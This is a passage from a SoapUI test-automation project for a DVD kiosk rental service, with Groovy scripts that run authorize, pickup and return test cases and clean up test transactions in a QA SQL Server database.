sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="PickupValidation" id="f3421446-85b2-4b51-9c76-691a7abe0c3b"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["PickupValidation"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' )
def AccountNumber = context.expand( '${#TestCase#AccountNumber}' )

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("CustomerProfileNumber", CustomerProfileNumber);
tc.setPropertyValue("AccountNumber", AccountNumber);
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [PickupValidation] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="18a09778-5b29-4814-82cf-80abd51582e0"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Pickup" id="880c8c75-f897-404a-b997-3152f1b82865"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", "false");//hardCoded
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("CardType", authtc.getPropertyValue("CCType"));

tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Pickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="f2ea384c-641f-4a51-aadf-5c3ecc4b80df"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
			if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("SuccessCount",(testRunner.testCase.getPropertyValue("SuccessCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="5e139625-c8b3-4e7e-8b93-b62e4daba18b" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="f4304833-f6bf-4962-8512-92487f96f056" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Reset properties
testRunner.testCase.setPropertyValue("SuccessCount","0");
testRunner.testCase.setPropertyValue("FailCount","0");
testRunner.testCase.setPropertyValue("TotalScenarioCount","0");

//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE TransactionId = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1759800</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148828368</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>00</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>05/25/18-11:13:14.010</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>05/25/18-11:13:33.509</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5554212</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81483122978646</con:value></con:property><con:property><con:name>SuccessCount</con:name><con:value>2</con:value></con:property><con:property><con:name>FailCount</con:name><con:value>0</con:value></con:property><con:property><con:name>TotalScenarioCount</con:name><con:value>0</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5a35d39d-4f88-4217-bf3a-f3cebdc33ac5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="450e709c-b1d8-452f-9a5b-7b083ac903d3" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="RecommendedTitles" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="1f11ba4d-4b6b-4f51-bf05-90633243319d"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="334f1268-099d-4588-a430-ea909178e452"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>Online</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="113973c1-68e5-4fa0-9d15-fc4d58e84168"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason
 
//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
log.info ("CustomerProfileNumber: $CustomerProfileNumber");
//if (CustomerProfileNumber == '&lt;CPCUSTOMERNUMBER/>')
//{
//	testRunner.testCase.setPropertyValue("CustomerProfileNumber","");
//}
//else
//{
	testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
//}

def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="00d3dbfd-9dbd-4533-a304-5108a3746024"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
